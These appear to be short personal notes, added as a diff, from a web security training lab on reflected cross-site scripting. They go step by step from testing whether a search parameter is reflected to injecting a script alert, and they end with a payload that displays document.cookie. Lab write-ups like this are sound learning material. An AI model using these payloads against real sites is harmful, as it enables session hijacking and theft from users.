@@ -1,0 +1,19 @@
+Purpose: Lab: Reflected XSS into HTML context with nothing encoded
+
+Goal: if Web App is vulnerable to Cross-site scripting
+
+Analysis:
+Step 1: check if form input is reflected as output
+?search=Flower
+I get output of input field displayed
+
+Step 2: check if html tag is interpreted by browser
+?search=<h1>Flower</h1>
+
+Step 3: Highly likely that web app is vulnerable to XSS
+?search=<script>alert('Flower')</script>
+get the pop up alert
+
+(Not part of this lab1)
+Step 4:
+?search=<script>alert(document.cookie)</script>
